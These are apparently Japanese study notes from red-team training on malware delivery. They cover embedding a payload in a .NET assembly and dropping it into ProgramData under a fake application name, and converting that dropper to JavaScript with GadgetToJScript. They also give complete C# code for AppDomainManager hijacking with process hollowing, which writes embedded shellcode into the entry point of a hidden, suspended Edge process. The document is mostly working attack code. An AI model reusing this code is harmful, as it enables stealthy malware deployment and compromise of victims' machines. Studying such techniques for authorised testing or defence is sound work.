ペイロードをコンテナに直接パッケージせず、ドロッパーを利用する
ほとんどのドロッパーは、自身のイメージ内部に埋め込まれたリソースを抽出するか、HTTP(S) または DNS などのプロトコルを通じてダウンロードする

GadgetToJScript(G2JS) を使用して .NET アセンブリから JavaScript ドロッパーを作成する方法

Visual StudioでClass Libraly(.NET Framework)を選択
![](images/Pasted%20image%2020260526174523.png)

プロジェクトを右クリック>Add > Exisiting Itemから、注入したいペイロードを選択
Build ActionをEmbedded Resourceにしておく
![](images/Pasted%20image%2020260526174709.png)

G2JSが正しく動作するためには、すべてのC#コードをクラスコンストラクタ内に記述する必要
```c#
using System.Reflection;
  
namespace MyDropper
{
    public class Dropper
    {
        public Dropper()
        {
            // use reflection to get reference to own assembly
            var assembly = Assembly.GetExecutingAssembly();
  
            // read embedded payload
            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe"))
            {
                // do something
            }
        }
    }
}
```

ペイロードが読み込まれたら、ディスク上にドロップできる。以下の標準的な場所に限定する
- `C:\Program Files\*`
- `C:\Program Files (x86)\*`
- `C:\ProgramData\*`：標準ユーザが書き込み可能
- `C:\Windows\*`

ProgramDataディレクトリに配置
```c#
using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe"))
{
    // get path to ProgramData
    var path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
    
    // construct new path with our dir name
    var newPath = Path.Combine(path, "MyLegitApp");
    
    // create new directory inside ProgramData
    var newDir = Directory.CreateDirectory(newPath);
  
    // construct path for the executable
    var filePath = Path.Combine(newDir.FullName, "MyApp.exe");
    
    // drop the path to disk
    using (var fs = File.Create(filePath))
    {
        // copy resource stream into file stream
        rs.CopyTo(fs);
  
        // close file
        rs.Close();
    }
}
```

プロジェクトをビルドするとdllが作成される。G2JSを使用してシリアル化
```powershell
PS C:\Users\Attacker> C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll -w js -b -o C:\Payloads\dropper
[+]: Generating the js payload
[+]: First stage gadget generation done.
[+]: Loading your .NET assembly:C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: C:\Payloads\dropper.js
```


プロセスホロウィングのc#コード
```c#
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
 
namespace AppDomainHijack
{
    public sealed class DomainManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            var si = new STARTUPINFOA
            {
                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
            };
 
            // create hidden + suspended msedge process
            var success = CreateProcessA(
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                ref si,
                out var pi);
 
            if (!success)
                return;
 
            // get basic process information
            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
            var lpPbi = Marshal.AllocHGlobal(szPbi);
 
            NtQueryInformationProcess(
                pi.hProcess,
                PROCESSINFOCLASS.ProcessBasicInformation,
                lpPbi,
                (uint)szPbi,
                out _);
 
            // marshal data to structure
            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
            Marshal.FreeHGlobal(lpPbi);
 
            // calculate pointer to image base address
            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
 
            // buffer to hold data, 64-bit addresses are 8 bytes
            var bImageBaseAddress = new byte[8];
 
            // read data from spawned process
            ReadProcessMemory(
                pi.hProcess,
                lpImageBaseAddress,
                bImageBaseAddress,
                8,
                out _);
 
            // convert address bytes to pointer
            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
 
            // read pe headers
            var data = new byte[512];
 
            ReadProcessMemory(
                pi.hProcess,
                baseAddress,
                data,
                512,
                out _);
 
            // read e_lfanew
            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
 
            // calculate rva
            var rvaOffset = e_lfanew + 0x28;
            var rva = BitConverter.ToUInt32(data, rvaOffset);
 
            // calculate address of entry point
            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
 
            // read the shellcode
            byte[] shellcode;
 
            var assembly = Assembly.GetExecutingAssembly();
 
            using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
            {
                // convert stream to raw byte[]
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    shellcode = ms.ToArray();
                }
            }
 
            // copy shellcode into address of entry point
            WriteProcessMemory(
                pi.hProcess,
                lpEntryPoint,
                shellcode,
                shellcode.Length,
                out _);
 
            // resume process
            ResumeThread(pi.hThread);
        }
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool CreateProcessA(
            string applicationName,
            string commandLine,
            IntPtr processAttributes,
            IntPtr threadAttributes,
            bool inheritHandles,
            PROCESS_CREATION_FLAGS creationFlags,
            IntPtr environment,
            string currentDirectory,
            ref STARTUPINFOA startupInfo,
            out PROCESS_INFORMATION processInformation);
 
        [DllImport("ntdll.dll", ExactSpelling = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern uint NtQueryInformationProcess(
            IntPtr processHandle,
            PROCESSINFOCLASS processInformationClass,
            IntPtr processInformation,
            uint processInformationLength,
            out uint returnLength);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool ReadProcessMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            UInt64 size,
            out uint numberOfBytesRead);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern bool WriteProcessMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            int size,
            out int numberOfBytesWritten);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        private static extern uint ResumeThread(IntPtr threadHandle);
    }
 
    [Flags]
    public enum PROCESS_CREATION_FLAGS : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_SECURE_PROCESS = 0x00400000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
    }
 
    public struct STARTUPINFOA
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public STARTUPINFO_FLAGS dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
 
    [Flags]
    public enum STARTUPINFO_FLAGS : uint
    {
        STARTF_FORCEONFEEDBACK = 0x00000040,
        STARTF_FORCEOFFFEEDBACK = 0x00000080,
        STARTF_PREVENTPINNING = 0x00002000,
        STARTF_RUNFULLSCREEN = 0x00000020,
        STARTF_TITLEISAPPID = 0x00001000,
        STARTF_TITLEISLINKNAME = 0x00000800,
        STARTF_UNTRUSTEDSOURCE = 0x00008000,
        STARTF_USECOUNTCHARS = 0x00000008,
        STARTF_USEFILLATTRIBUTE = 0x00000010,
        STARTF_USEHOTKEY = 0x00000200,
        STARTF_USEPOSITION = 0x00000004,
        STARTF_USESHOWWINDOW = 0x00000001,
        STARTF_USESIZE = 0x00000002,
        STARTF_USESTDHANDLES = 0x00000100
    }
 
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
 
    public enum PROCESSINFOCLASS
    {
        ProcessBasicInformation = 0
    }
 
    public struct PROCESS_BASIC_INFORMATION
    {
        public uint ExitStatus;
        public IntPtr PebBaseAddress;
        public ulong AffinityMask;
        public int BasePriority;
        public ulong UniqueProcessId;
        public ulong InheritedFromUniqueProcessId;
    }
}

```